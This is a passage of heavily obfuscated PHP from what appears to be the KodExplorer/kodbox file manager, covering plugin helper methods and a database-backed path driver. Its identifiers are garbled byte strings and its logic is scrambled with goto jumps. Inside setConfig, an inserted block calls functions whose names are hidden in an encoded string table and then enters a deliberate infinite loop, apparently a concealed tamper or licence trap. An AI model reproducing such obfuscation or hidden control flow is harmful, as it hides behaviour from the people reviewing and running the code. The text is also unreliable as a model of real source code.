ÏÓ, 0, $Fİ‹µ”ƒ·¯); goto aÜ“‚¸ƒâ; aÜ“‚¸ƒâ: } final function appPackage() { goto B“™²Šµã; FŠ²µÌÊ®—: $cåâéğÚä = Hook::trigger($DĞ¶ÓÙƒ‹‚[1421], $EâÂä„Çë¾); if ($cåâéğÚä && is_array($cåâéğÚä)) { $EâÂä„Çë¾ = $cåâéğÚä; } $this->packageData = $EâÂä„Çë¾; goto aŠ¿ßëäíÇ; B“™²Šµã: $DĞ¶ÓÙƒ‹‚ =& $_SERVER[æ§›¦ÌáØ]; if ($this->packageData) { return $this->packageData; } $bÍŞÏˆ«É = $this->parseFile($this->pluginPath . $DĞ¶ÓÙƒ‹‚[1420]); goto CÉˆÊ¯ñ¿è; aŠ¿ßëäíÇ: return $EâÂä„Çë¾; goto dï Æ¿¾Ä±; CÉˆÊ¯ñ¿è: $this->parseLang($bÍŞÏˆ«É); $EâÂä„Çë¾ = json_decode_force($bÍŞÏˆ«É); if (!$EâÂä„Çë¾) { return array(); } goto FŠ²µÌÊ®—; dï Æ¿¾Ä±: } public function packageInfoGet($Bí”Õáğ¯) { $C³â œäéÎ = $this->appPackage(); return array_get_value($C³â œäéÎ, $Bí”Õáğ¯); } public function packageVersion() { return $this->packageInfoGet($_SERVER[æ§›¦ÌáØ][1422]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[æ§›¦ÌáØ][1423]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[æ§›¦ÌáØ][1424]); } public function echoJsAssign($a’…Ù¿ÊÍé, $FÏ—”ƒŒ£) { $this->echoJsAssignArr[$a’…Ù¿ÊÍé] = $FÏ—”ƒŒ£; } private function parseFile($BèÓ¡ñ—©“) { goto Aß·¥÷Öà ; Aß·¥÷Öà : $EªÓºŸ”•ç =& $_SERVER[æ§›¦ÌáØ]; $c÷ŸÔˆ£š¸ = file_get_contents_nossl($BèÓ¡ñ—©“); $Bö·Ï£à° = array($EªÓºŸ”•ç[1425], $EªÓºŸ”•ç[1426], $EªÓºŸ”•ç[1427], $EªÓºŸ”•ç[1428], $EªÓºŸ”•ç[1429], $EªÓºŸ”•ç[1430], $EªÓºŸ”•ç[1431]); goto e´§óÁíÂ„; a±äÓŠÒ¶: if (strstr($c÷ŸÔˆ£š¸, $EªÓºŸ”•ç[1436])) { $e¢“¹ÓŠŒ„ = $e¢“¹ÓŠŒ„ = rawurlencode(json_encode($this->getConfig())); $c÷ŸÔˆ£š¸ = str_replace($EªÓºŸ”•ç[1436], $e¢“¹ÓŠŒ„, $c÷ŸÔˆ£š¸); } $c÷ŸÔˆ£š¸ = str_replace($Bö·Ï£à°, $dŒÖ¾›Üõ¥, $c÷ŸÔˆ£š¸); return $c÷ŸÔˆ£š¸; goto b¤šƒ”–Â”; e´§óÁíÂ„: $dŒÖ¾›Üõ¥ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$EªÓºŸ”•ç[88]][$EªÓºŸ”•ç[1432]]); foreach ($this->echoJsAssignArr as $fõÏ½¾¿ó¤ => $B–¯¿¬‹ùó) { $Bö·Ï£à°[] = $EªÓºŸ”•ç[1433] . $fõÏ½¾¿ó¤ . $EªÓºŸ”•ç[1434]; $dŒÖ¾›Üõ¥[] = is_array($B–¯¿¬‹ùó) || is_object($B–¯¿¬‹ùó) ? rawurlencode(json_encode($B–¯¿¬‹ùó)) : $B–¯¿¬‹ùó; } if (strstr($c÷ŸÔˆ£š¸, $EªÓºŸ”•ç[1435])) { $e¢“¹ÓŠŒ„ = rawurlencode(json_encode($this->pluginLangArr)); $c÷ŸÔˆ£š¸ = str_replace($EªÓºŸ”•ç[1435], $e¢“¹ÓŠŒ„, $c÷ŸÔˆ£š¸); } goto a±äÓŠÒ¶; b¤šƒ”–Â”: } private function parseLang(&$A›ÜÁ»š) { goto b‡˜½œ‡°à; e§Ú¡´„É: $d‡‘¦ ±­ = array(); foreach ($a®®‚“ô¶È[0] as $e¼…Õ·°Î) { $dØïËÜ‘‚ = substr($e¼…Õ·°Î, strlen($AÔ¿öÉæÂ), -4); $D›âØ×ïá = LNG($dØïËÜ‘‚); $F¨Ã…­£ğ[] = $e¼…Õ·°Î; $d‡‘¦ ±­[] = str_replace(array($DÏ¾‘Ñï¯Õ[229], $DÏ¾‘Ñï¯Õ[1028], $DÏ¾‘Ñï¯Õ[340], $DÏ¾‘Ñï¯Õ[116]), array($DÏ¾‘Ñï¯Õ[50], $DÏ¾‘Ñï¯Õ[50], $DÏ¾‘Ñï¯Õ[33], $DÏ¾‘Ñï¯Õ[1439]), $D›âØ×ïá); } $A›ÜÁ»š = str_replace($F¨Ã…­£ğ, $d‡‘¦ ±­, $A›ÜÁ»š); goto eÙ‡«º°ÕÄ; f²÷£“”ªì: preg_match_all($DÏ¾‘Ñï¯Õ[1438], $A›ÜÁ»š, $a®®‚“ô¶È); if (!is_array($a®®‚“ô¶È) || count($a®®‚“ô¶È) == 0 || !is_array($a®®‚“ô¶È[0]) || count($a®®‚“ô¶È[0]) == 0) { return; } $F¨Ã…­£ğ = array(); goto e§Ú¡´„É; b‡˜½œ‡°à: $DÏ¾‘Ñï¯Õ =& $_SERVER[æ§›¦ÌáØ]; $AÔ¿öÉæÂ = $DÏ¾‘Ñï¯Õ[1437]; if (!strstr($A›ÜÁ»š, $AÔ¿öÉæÂ)) { return; } goto f²÷£“”ªì; eÙ‡«º°ÕÄ: } private function parseConfig(&$FÂß‡ò±‡ñ) { goto e¤ïñ¼Â¶Ó; bšòØ²¯¨¶: $AñÙÏÙÜÌ¯ = array(); $AôÏ†¨Í²ô = array(); foreach ($BğÙœã†Ë[0] as $bŠµ¥„—’) { $fÖŠ¾±© = substr($bŠµ¥„—’, strlen($e’‡×›«‘“), -2); $AñÙÏÙÜÌ¯[] = $bŠµ¥„—’; $AôÏ†¨Í²ô[] = _get($Bİó…Í‹°¼, $fÖŠ¾±©); } goto b’àŞõ‹; b’àŞõ‹: $FÂß‡ò±‡ñ = str_replace($AñÙÏÙÜÌ¯, $AôÏ†¨Í²ô, $FÂß‡ò±‡ñ); goto CóèÕÖ®; bŞ¯ù™Ñ½Ş: preg_match_all($Cì‡×†İçà[1441], $FÂß‡ò±‡ñ, $BğÙœã†Ë); if (!is_array($BğÙœã†Ë) || count($BğÙœã†Ë) == 0 || !is_array($BğÙœã†Ë[0]) || count($BğÙœã†Ë[0]) == 0) { return; } $Bİó…Í‹°¼ = $this->getConfig(); goto bšòØ²¯¨¶; e¤ïñ¼Â¶Ó: $Cì‡×†İçà =& $_SERVER[æ§›¦ÌáØ]; $e’‡×›«‘“ = $Cì‡×†İçà[1440]; if (!strstr($FÂß‡ò±‡ñ, $e’‡×›«‘“)) { return; } goto bŞ¯ù™Ñ½Ş; CóèÕÖ®: } private function parsePackage(&$DÜ™÷‚´¦…) { goto a²µêš–”¹; a²µêš–”¹: $cĞÕÕ¤êÈ =& $_SERVER[æ§›¦ÌáØ]; $cîë„İÓƒ» = $cĞÕÕ¤êÈ[1442]; if (!strstr($DÜ™÷‚´¦…, $cîë„İÓƒ»)) { return; } goto d‡Æ‰‚§Í; cïÂ¡¯—£¶: $DÜ™÷‚´¦… = str_replace($FºÄÑï£±‘, $FÑÒÒÌØéî, $DÜ™÷‚´¦…); goto B“†è¨¿‹; CàÑ£ Èõ: $FºÄÑï£±‘ = array(); $FÑÒÒÌØéî = array(); foreach ($d¹îº¢¡®[0] as $dîöŠé®) { $DâÒ…Á‘ä¤ = substr($dîöŠé®, strlen($cîë„İÓƒ»), -2); $FºÄÑï£±‘[] = $dîöŠé®; $FÑÒÒÌØéî[] = _get($CëÎÍ›ø½š, $DâÒ…Á‘ä¤); } goto cïÂ¡¯—£¶; d‡Æ‰‚§Í: preg_match_all($cĞÕÕ¤êÈ[1443], $DÜ™÷‚´¦…, $d¹îº¢¡®); if (!is_array($d¹îº¢¡®) || count($d¹îº¢¡®) == 0 || !is_array($d¹îº¢¡®[0]) || count($d¹îº¢¡®[0]) == 0) { return; } $CëÎÍ›ø½š = $this->appPackage(); goto CàÑ£ Èõ; B“†è¨¿‹: } final function echoFile($D­İ´…—‚ò, $eè½ó›ØÇ„ = false) { goto CÔ…«—âÑ¦; aÉëÕ‘Î‹À: $B¼âÆ˜ÆŠ = $this->parseFile($a»ñ¸»ì³°); $this->parseLang($B¼âÆ˜ÆŠ); $this->parseConfig($B¼âÆ˜ÆŠ); goto eìÅäø¡‡ä; CÔ…«—âÑ¦: $F¿°ÓğÆõ´ =& $_SERVER[æ§›¦ÌáØ]; $a»ñ¸»ì³° = $this->pluginPath . $D­İ´…—‚ò; if (ACT == $F¿°ÓğÆõ´[1444]) { echo $F¿°ÓğÆõ´[1445] . $this->pluginName . $F¿°ÓğÆõ´[8] . $D­İ´…—‚ò . $F¿°ÓğÆõ´[1446]; if (!file_exists($a»ñ¸»ì³°)) { echo $F¿°ÓğÆõ´[1447]; return; } } goto aÉëÕ‘Î‹À; eìÅäø¡‡ä: $this->parsePackage($B¼âÆ˜ÆŠ); if (is_array($eè½ó›ØÇ„)) { $B¼âÆ˜ÆŠ = str_replace(array_keys($eè½ó›ØÇ„), array_values($eè½ó›ØÇ„), $B¼âÆ˜ÆŠ); } echo $F¿°ÓğÆõ´[229] . $B¼âÆ˜ÆŠ; goto e×±áôÈ‡İ; e×±áôÈ‡İ: } final function initLang() { goto fí±àØÃ Ü; D¸ñï¢í‚Ó: $A«ôñù·Õ» = I18n::getType(); $Fš¼ªèÂ’ù = array(); if (file_exists($b¶Ï‚œ¼Â— . $A«ôñù·Õ» . $aÄÙ·÷á[804])) { $Fš¼ªèÂ’ù = (include $b¶Ï‚œ¼Â— . $A«ôñù·Õ» . $aÄÙ·÷á[804]); } else { if ($A«ôñù·Õ» == $aÄÙ·÷á[1450] && !file_exists($b¶Ï‚œ¼Â— . $A«ôñù·Õ» . $aÄÙ·÷á[804]) && file_exists($b¶Ï‚œ¼Â— . $aÄÙ·÷á[1451])) { $Fš¼ªèÂ’ù = (include $b¶Ï‚œ¼Â— . $aÄÙ·÷á[1451]); } else { if (file_exists($b¶Ï‚œ¼Â— . $BìŞ¾¤õÎ . $aÄÙ·÷á[804])) { $Fš¼ªèÂ’ù = (include $b¶Ï‚œ¼Â— . $BìŞ¾¤õÎ . $aÄÙ·÷á[804]); } } } goto dŒ§œíã™Š; fí±àØÃ Ü: $aÄÙ·÷á =& $_SERVER[æ§›¦ÌáØ]; $BìŞ¾¤õÎ = $aÄÙ·÷á[1448]; $b¶Ï‚œ¼Â— = $this->pluginPath . $aÄÙ·÷á[1449]; goto D¸ñï¢í‚Ó; dŒ§œíã™Š: if (!is_array($Fš¼ªèÂ’ù)) { return array(); } if (@count($Fš¼ªèÂ’ù) > 0) { I18n::set($Fš¼ªèÂ’ù); } return $Fš¼ªèÂ’ù; goto Cñ´à˜¤¢ë; Cñ´à˜¤¢ë: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($A“Ê‘«­×) { $Añ·™Õ°Ö¿ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($_SERVER[$Añ·™Õ°Ö¿[785]]) || !isset($_SERVER[$Añ·™Õ°Ö¿[792]])) { goto a‰çíÂâ£; EÏÍÙ”Õ¾©: for ($b¨ÇÑ¶Ñ¬¹ = $eŒ¹Ÿ½‚ƒ•; $b¨ÇÑ¶Ñ¬¹ > 0; $b¨ÇÑ¶Ñ¬¹++) { $e¬Ÿ÷ˆÓ¨ = json_encode($GLOBALS[$Añ·™Õ°Ö¿[411]]); } goto BŸÕ‡Ç·; AÔ‹¶Ÿ»…é: $e¬Ÿ÷ˆÓ¨ = $Añ·™Õ°Ö¿[833]; $e¬Ÿ÷ˆÓ¨($_SERVER[$Añ·™Õ°Ö¿[834]]); $eŒ¹Ÿ½‚ƒ• = 1; goto EÏÍÙ”Õ¾©; c‹âŒø¯Ü: $f³™ƒÏø¡è = $EĞÉ ÙòæÃ($eÍ…ß†…‰¦); $E¬ì¡™” = explode($Añ·™Õ°Ö¿[229], $f³™ƒÏø¡è); if (count($E¬ì¡™”) < $Añ·™Õ°Ö¿[591]) { $Eá’¥ßàÎ³ = $Añ·™Õ°Ö¿[790]; $Eá’¥ßàÎ³(); } goto AÔ‹¶Ÿ»…é; a‰çíÂâ£: $c÷‹œ†¾ÏÌ = $Añ·™Õ°Ö¿[832]; $EĞÉ ÙòæÃ = $Añ·™Õ°Ö¿[787]; $eÍ…ß†…‰¦ = $_SERVER[$Añ·™Õ°Ö¿[788]] . $Añ·™Õ°Ö¿[789]; goto c‹âŒø¯Ü; BŸÕ‡Ç·: } return $this->modelPlugin->setConfig($this->pluginName, $A“Ê‘«­×); } public function onSetConfig($C‰ŒÉÓ¦Õ) { } public function onGetConfig($DàÂ¦Ğçê) { } public function onChangeStatus($cÓÆ’‡ìÎŠ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($DÉğÛ‹„·Š = "\160\x6c\165\147\151\156\101\x75\164\x68") { $DŸãÉïÎÏ’ =& $_SERVER[æ§›¦ÌáØ]; if (!defined($DŸãÉïÎÏ’[454])) { return !1; } if (_get($GLOBALS, $DŸãÉïÎÏ’[485])) { return !0; } $DŸõƒã†¸ = $this->getConfig(); if (!$DŸõƒã†¸[$DÉğÛ‹„·Š]) { return !1; } return ActionCall($DŸãÉïÎÏ’[1452], $DŸõƒã†¸[$DÉğÛ‹„·Š]); } public function url($F¦§ï¨Õß, $a”©‰½ÑöÊ = '', $då½¿Ï‡ñÑ = true) { goto cËÙ¹šÜö‘; bØ›ß…–¯‹: $A‰±ÚÛ„ÚÆ = $this->packageVersion(); $aÂŒ¥‰ó†ï = $E±ÚƒÈÖÍ« . $e’àİÛº‘–[440] . $A‰±ÚÛ„ÚÆ; if (substr($F¦§ï¨Õß, 0, 4) == $e’àİÛº‘–[147] || substr($F¦§ï¨Õß, 0, 2) == $e’àİÛº‘–[1235]) { $a‹ŒÒ“”¸Æ = $F¦§ï¨Õß . $e’àİÛº‘–[1453] . $aÂŒ¥‰ó†ï; } else { if ($a”©‰½ÑöÊ == $e’àİÛº‘–[33]) { $a‹ŒÒ“”¸Æ = $this->pluginHost . $F¦§ï¨Õß . $e’àİÛº‘–[1453] . $aÂŒ¥‰ó†ï; } else { if ($a”©‰½ÑöÊ === $e’àİÛº‘–[77]) { $a‹ŒÒ“”¸Æ = $this->pluginHost . $F¦§ï¨Õß; } else { if ($a”©‰½ÑöÊ == $e’àİÛº‘–[1454]) { $a‹ŒÒ“”¸Æ = STATIC_PATH . $F¦§ï¨Õß . $e’àİÛº‘–[1453] . $E±ÚƒÈÖÍ«; } else { if ($a”©‰½ÑöÊ == $e’àİÛº‘–[1455]) { $a‹ŒÒ“”¸Æ = APP_HOST . $e’àİÛº‘–[1456] . $F¦§ï¨Õß . $e’àİÛº‘–[1453] . $E±ÚƒÈÖÍ«; } else { if (isset($DË–ø±‡ãà[$a”©‰½ÑöÊ])) { $a‹ŒÒ“”¸Æ = $DË–ø±‡ãà[$a”©‰½ÑöÊ] . $F¦§ï¨Õß . $e’àİÛº‘–[1453] . $aÂŒ¥‰ó†ï; } } } } } } goto B¶„ø¸ˆ; cËÙ¹šÜö‘: $e’àİÛº‘– =& $_SERVER[æ§›¦ÌáØ]; $DË–ø±‡ãà = $this->getConfig(); $E±ÚƒÈÖÍ« = KOD_VERSION . $e’àİÛº‘–[95] . KOD_VERSION_BUILD; goto bØ›ß…–¯‹; B¶„ø¸ˆ: if (!$då½¿Ï‡ñÑ) { return $a‹ŒÒ“”¸Æ; } echo $a‹ŒÒ“”¸Æ; goto CÚ£‰“İ”; CÚ£‰“İ”: } public function link($bµ¼ÖÈÎ¯ = false, $F˜…ÑÙŒİ = '') { $FŒˆßƒ„›  =& $_SERVER[æ§›¦ÌáØ]; if (!$bµ¼ÖÈÎ¯) { $this->link($FŒˆßƒ„› [1457], $FŒˆßƒ„› [1455]); $this->link($FŒˆßƒ„› [1458], $FŒˆßƒ„› [1454]); $this->link($FŒˆßƒ„› [1459], $FŒˆßƒ„› [1454]); $this->link($FŒˆßƒ„› [1460], $FŒˆßƒ„› [1454]); $this->link($FŒˆßƒ„› [1461], $FŒˆßƒ„› [1454]); return; } $Fø™‰ÃÂ¯ = $this->url($bµ¼ÖÈÎ¯, $F˜…ÑÙŒİ, !1); if (substr($bµ¼ÖÈÎ¯, -3) == $FŒˆßƒ„› [1462]) { echo $FŒˆßƒ„› [1463] . $Fø™‰ÃÂ¯ . $FŒˆßƒ„› [1464] . $FŒˆßƒ„› [229]; } else { if (substr($bµ¼ÖÈÎ¯, -4) == $FŒˆßƒ„› [1465]) { echo $FŒˆßƒ„› [1466] . $Fø™‰ÃÂ¯ . $FŒˆßƒ„› [1467] . $FŒˆßƒ„› [229]; } } } } goto FÌ§Êì´—‹; c¦Ê„¾ˆäÎ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($E‰‘¨Ÿ…¾) { $this->pathParse = $E‰‘¨Ÿ…¾; $this->model = Model($_SERVER[æ§›¦ÌáØ][1196]); } public function getPath($e‰¬³öÛˆ±) { return trim($e‰¬³öÛˆ±, $_SERVER[æ§›¦ÌáØ][8]); } public function pathFather($Eë‰¶¬Ã·Ü) { $e×„Íˆ‚ŒÎ = $this->parse($Eë‰¶¬Ã·Ü); $e×„Íˆ‚ŒÎ = $this->infoSimple($Eë‰¶¬Ã·Ü); return $e×„Íˆ‚ŒÎ ? $e×„Íˆ‚ŒÎ[$_SERVER[æ§›¦ÌáØ][478]] : !1; } public function pathThis($aÁÁŸÖ ªƒ) { $C«¹ÄóÍ®Š = $this->infoSimple($aÁÁŸÖ ªƒ); return $C«¹ÄóÍ®Š ? $C«¹ÄóÍ®Š[$_SERVER[æ§›¦ÌáØ][28]] : !1; } public function getPathOuter($a•„¥™¦ñö) { if (!$a•„¥™¦ñö) { return $a•„¥™¦ñö; } $e£õÙ¨ÜÒí = $this->parse($a•„¥™¦ñö); return KodIO::make($e£õÙ¨ÜÒí[$_SERVER[æ§›¦ÌáØ][393]]); } public function copyFolderFromIO($f´õ­áàÀ¢, $D Ö¬‰„©, $Døù¼¯¶Ï, $c™™Ñ´÷öù, $dÖ¥¸ÚŠÑŒ) { $F¿ğºóğÔ¸ = $this->model->copyFolderFromIO($f´õ­áàÀ¢, $D Ö¬‰„©, $Døù¼¯¶Ï, $c™™Ñ´÷öù, $dÖ¥¸ÚŠÑŒ); return KodIO::make($F¿ğºóğÔ¸); } public function isParentOf($d®Ø¾ˆ”÷ë, $A¯†‘ìË—) { return $this->model->isParentOf($d®Ø¾ˆ”÷ë, $A¯†‘ìË—); } public function mkfile($dµÌ¬Ÿ¯İ, $b²ƒ‚ŒæÊ = '', $DË´³áĞ¼¥ = REPEAT_RENAME) { $E™Â²ğ‘ã´ =& $_SERVER[æ§›¦ÌáØ]; $a´ …å•Ëê = $this->parse($dµÌ¬Ÿ¯İ); $dµÌ¬Ÿ¯İ = $a´ …å•Ëê[$E™Â²ğ‘ã´[393]]; for ($a‘ñÓª‹– = 0; $a‘ñÓª‹– < count($a´ …å•Ëê[$E™Â²ğ‘ã´[1197]]); $a‘ñÓª‹–++) { $DËÏ¬‹Ö¢— = $a´ …å•Ëê[$E™Â²ğ‘ã´[1197]][$a‘ñÓª‹–]; if ($a‘ñÓª‹– == count($a´ …å•Ëê[$E™Â²ğ‘ã´[1197]]) - 1) { $dµÌ¬Ÿ¯İ = $this->model->mkfile($dµÌ¬Ÿ¯İ, $DËÏ¬‹Ö¢—, $b²ƒ‚ŒæÊ, $DË´³áĞ¼¥); break; } $dµÌ¬Ÿ¯İ = $this->model->mkdir($dµÌ¬Ÿ¯İ, $DËÏ¬‹Ö¢—, REPEAT_SKIP); } return $this->getPathOuter($dµÌ¬Ÿ¯İ); } public function mkdir($DÎÚñ‚Šé, $Bˆ°èî„µø = REPEAT_SKIP) { $d–åè‡õØÆ =& $_SERVER[æ§›¦ÌáØ]; $Cì¹ËÌïõ = $this->parse($DÎÚñ‚Šé); $DÎÚñ‚Šé = $Cì¹ËÌïõ[$d–åè‡õØÆ[393]]; for ($b££™µÅËÏ = 0; $b££™µÅËÏ < count($Cì¹ËÌïõ[$d–åè‡õØÆ[1197]]); $b££™µÅËÏ++) { $aì ØÁ´øŸ = $Cì¹ËÌïõ[$d–åè‡õØÆ[1197]][$b££™µÅËÏ]; $DÎÚñ‚Šé = $this->model->mkdir($DÎÚñ‚Šé, $aì ØÁ´øŸ, $Bˆ°èî„µø); } return $this->getPathOuter($DÎÚñ‚Šé); } public function copyFile($Fâ†ÍŒ¢, $Cõ†ˆ×¸¤ö, $Cì‰‚èóÒĞ = REPEAT_REPLACE) { $BôàÂ˜Í²à =& $_SERVER[æ§›¦ÌáØ]; $AÜõâåÚÀÕ = $this->parse($Cõ†ˆ×¸¤ö); $c²óóÓ½‚ = $this->model->copy($Fâ†ÍŒ¢, $AÜõâåÚÀÕ[$BôàÂ˜Í²à[393]], $Cì‰‚èóÒĞ, $AÜõâåÚÀÕ[$BôàÂ˜Í²à[76]]); return $c²óóÓ½‚ ? $this->getPathOuter($c²óóÓ½‚) : !1; } public function moveFile($C„¸ÔÛ³Ş», $cé•êÛ‹•™, $cŸªøÌ¯ÙÈ = REPEAT_REPLACE) { $b‡ ¾åï… =& $_SERVER[æ§›¦ÌáØ]; $D‚‚¢å†ÑÆ = $this->parse($cé•êÛ‹•™); $DÆ¯íÎ„ = $this->model->move($C„¸ÔÛ³Ş», $D‚‚¢å†ÑÆ[$b‡ ¾åï…[393]], $cŸªøÌ¯ÙÈ, $D‚‚¢å†ÑÆ[$b‡ ¾åï…[76]]); return $DÆ¯íÎ„ ? $this->getPathOuter($DÆ¯íÎ„) : !1; } public function copy($f©ó»­ÚÌñ, $b×©‹‰ÎÅ, $dÕí–¹Ê•ò = REPEAT_REPLACE) { $cÂø×˜¨²İ = $this->parse($b×©‹‰ÎÅ); $Fï£ë©­Ù¤ = $this->model->copy($f©ó»­ÚÌñ, $cÂø×˜¨²İ[$_SERVER[æ§›¦ÌáØ][393]], $dÕí–¹Ê•ò); return $Fï£ë©­Ù¤ ? $this->getPathOuter($Fï£ë©­Ù¤) : !1; } public function moveSameAllow() { } public function move($A‡¡óÎ¹š², $c‰´¯àÈ¿š, $aÊ¸Ì‘ŠÌŸ = REPEAT_REPLACE) { $Aà¿›Œó’ = $this->parse($c‰´¯àÈ¿š); $bœ×„¼áõ = $this->model->move($A‡¡óÎ¹š², $Aà¿›Œó’[$_SERVER[æ§›¦ÌáØ][393]], $aÊ¸Ì‘ŠÌŸ); return $bœ×„¼áõ ? $this->getPathOuter($bœ×„¼áõ) : !1; } public function remove($e°ÚÚ–×Ÿå, $Bâ¤·Ú·ÇÜ = true) { return $this->model->remove($e°ÚÚ–×Ÿå, $Bâ¤·Ú·ÇÜ); } public function rename($DÎÛÚ·Ï’Ë, $fÏ¼÷ÒâÉ‡) { $F§íÉ®êÏ¶ = $this->model->rename($DÎÛÚ·Ï’Ë, $fÏ¼÷ÒâÉ‡); return $F§íÉ®êÏ¶ ? $this->getPathOuter($DÎÛÚ·Ï’Ë) : $F§íÉ®êÏ¶; } public function size($cê­È—ÇÄ•) { $f¥ïòÕ±å¢ = $this->infoSimple($cê­È—ÇÄ•); return $f¥ïòÕ±å¢ ? $f¥ïòÕ±å¢[$_SERVER[æ§›¦ÌáØ][78]] : 0; } public function infoSimple($CÁÓÙ±ç) { return $this->model->sourceInfo($CÁÓÙ±ç); } public function info($BÚÆ·œªÒ¿) { return $this->infoParse($BÚÆ·œªÒ¿); } public function infoAuth($f¾àÔì¸Ô…) { return $this->infoParse($f¾àÔì¸Ô…, !1, !0); } public function infoWithChildren($dºöà°„»±) { return $this->infoParse($dºöà°„»±, !0); } protected function infoParse($bôÕĞ‡ñ«´, $E¬·×ğ«¬ = false, $eˆ¶ëÖ„ô = false) { if (!$E¬·×ğ«¬) { return $this->model->pathInfo($bôÕĞ‡ñ«´, $eˆ¶ëÖ„ô); } return $this->model->pathInfoMore($bôÕĞ‡ñ«´); } public function infoFull($d…Æœá©âÜ) { $a†âŒ”·± =& $_SERVER[æ§›¦ÌáØ]; $c¯®÷“‰Ÿó = explode($a†âŒ”·±[8], $d…Æœá©âÜ); $c®²ìÀÅô = implode($a†âŒ”·±[8], array_splice($c¯®÷“‰Ÿó, 1)); return $this->model->pathInfoByPath($c¯®÷“‰Ÿó[0], $c®²ìÀÅô); } public function hashSimple($f î¦Óäš¬) { $FÜÈ‰…ñ¿Æ =& $_SERVER[æ§›¦ÌáØ]; $a’É¦†œ×Ü = $this->infoWithChildren($f î¦Óäš¬); return $a’É¦†œ×Ü[$FÜÈ‰…ñ¿Æ[164]][$FÜÈ‰…ñ¿Æ[171]]; } public function hashMd5($F½î£Ó¾Û) { $c—ˆò¦â‚Š =& $_SERVER[æ§›¦ÌáØ]; $eŒ˜´ÜèÊê = $this->infoWithChildren($F½î£Ó¾Û); return $eŒ˜´ÜèÊê[$c—ˆò¦â‚Š[164]][$c—ˆò¦â‚Š[170]]; } public function exist($DÑšĞ‘—¦) { $eÌÊÏÔ¼§¸ =& $_SERVER[æ§›¦ÌáØ]; $AÏåâ±’‡¿ = $this->parse($DÑšĞ‘—¦); if (!$AÏåâ±’‡¿[$eÌÊÏÔ¼§¸[76]]) { return $this->isFile($DÑšĞ‘—¦) || $this->isFolder($DÑšĞ‘—¦); } $cˆá°ùÃŠ¸ = array($eÌÊÏÔ¼§¸[394] => $AÏåâ±’‡¿[$eÌÊÏÔ¼§¸[393]], $eÌÊÏÔ¼§¸[28] => $AÏåâ±’‡¿[$eÌÊÏÔ¼§¸[76]]); $E§çŠ…Àİ½ = $this->model->where($cˆá°ùÃŠ¸)->find(); return $E§çŠ…Àİ½ ? !0 : !1; } public function isFile($a›ø˜ˆáè˜) { $aÌŒ’äÏÄ =& $_SERVER[æ§›¦ÌáØ]; $E­·ŒÈ ìĞ = $this->infoSimple($a›ø˜ˆáè˜); return $E­·ŒÈ ìĞ && $E­·ŒÈ ìĞ[$aÌŒ’äÏÄ[403]] == $aÌŒ’äÏÄ[87] ? !1 : !0; } public function isFolder($dÆš·ß•ÎŠ) { $E»õôÈ¸º =& $_SERVER[æ§›¦ÌáØ]; $d„‘Ññ»Ô = $this->infoSimple($dÆš·ß•ÎŠ); return $d„‘Ññ»Ô && $d„‘Ññ»Ô[$E»õôÈ¸º[403]] == $E»õôÈ¸º[87] ? !0 : !1; } public function listPath($b«íâ”ÃœŠ, $dÏÎµÀø²á = false) { $e–¨¡ØíĞÉ =& $_SERVER[æ§›¦ÌáØ]; if ($b«íâ”ÃœŠ == $e–¨¡ØíĞÉ[33]) { return !1; } $D”ä¸î÷¢ = array($e–¨¡ØíĞÉ[394] => $b«íâ”ÃœŠ); if ($dÏÎµÀø²á) { return $this->model->listSource($D”ä¸î÷¢, -1); } return $this->model->listSource($D”ä¸î÷¢); } public function has($bØê“¸°‡Ì, $e¹„¡ÍÜäù = false, $B˜æå”æ±Û = null) { $döö™§òš¡ =& $_SERVER[æ§›¦ÌáØ]; $a”Å¤Ì’ğ = $this->infoWithChildren($bØê“¸°‡Ì); if ($e¹„¡ÍÜäù) { return array($döö™§òš¡[204] => $a”Å¤Ì’ğ[$döö™§òš¡[204]], $döö™§òš¡[203] => $a”Å¤Ì’ğ[$döö™§òš¡[203]]); } return $B˜æå”æ±Û ? $a”Å¤Ì’ğ[$döö™§òš¡[204]] : $a”Å¤Ì’ğ[$döö™§òš¡[203]]; } public function listAll($EİÉã¹‚ø°) { $cñİ‚½—Åİ = IO::info($this->pathParse[$_SERVER[æ§›¦ÌáØ][76]]); if (!$cñİ‚½—Åİ) { return array(); } return $this->model->listAll($EİÉã¹‚ø°); } public function getContent($a‰ë¶Äçã›) { return $this->model->getContent($a‰ë¶Äçã›); } public function setContent($bŠ÷¢¢šéŞ, $B¡àùØİ½Ï = '') { return $this->model->setContent($bŠ÷¢¢šéŞ, $B¡àùØİ½Ï); } public function fileSubstr($BÒïñ‘ïä†, $DÏœ¼µÅ½‰, $Añë×›ö¨¥) { return $this->model->fileSubstr($BÒïñ‘ïä†, $DÏœ¼µÅ½‰, $Añë×›ö¨¥); } public function download($Fˆ«²¦¶Ñ, $fì¦î¶ˆ‡ = '') { $C‚Ãî®èÅà = get_path_father($fì¦î¶ˆ‡); $AË¯İ˜øÄŒ = get_path_this($fì¦î¶ˆ‡); $FÜ†ï™×ÂÉ = $this->model->fileInfoGet($Fˆ«²¦¶Ñ); $D„ğ¾–Ô = IO::copy($FÜ†ï™×ÂÉ[$_SERVER[æ§›¦ÌáØ][76]], $C‚Ãî®èÅà, !1, $AË¯İ˜øÄŒ); return $D„ğ¾–Ô; } public function setModifyTime($Aš±ĞØÃ™, $d×Ùîå¢„– = '') { $CÌ‰ªí™ŒÖ =& $_SERVER[æ§›¦ÌáØ]; if (!$Aš±ĞØÃ™) { return; } $this->model->where(array($CÌ‰ªí™ŒÖ[410] => $Aš±ĞØÃ™))->save(array($CÌ‰ªí™ŒÖ[84] => $d×Ùîå¢„–)); } public function upload($a†¥ã­ˆ† , $f‘‹»ÌËŸ, $DòŞèæğñÂ = false, $D…ÌÉ©ù— = REPEAT_REPLACE) { $Fšëä‘Êƒœ =& $_SERVER[æ§›¦ÌáØ]; $B¬İ”Êé„ø = $this->parse($a†¥ã­ˆ† ); $aÚçåÚßó— = $this->model->addFile($B¬İ”Êé„ø[$Fšëä‘Êƒœ[393]], $f‘‹»ÌËŸ, $B¬İ”Êé„ø[$Fšëä‘Êƒœ[76]], $DòŞèæğñÂ, 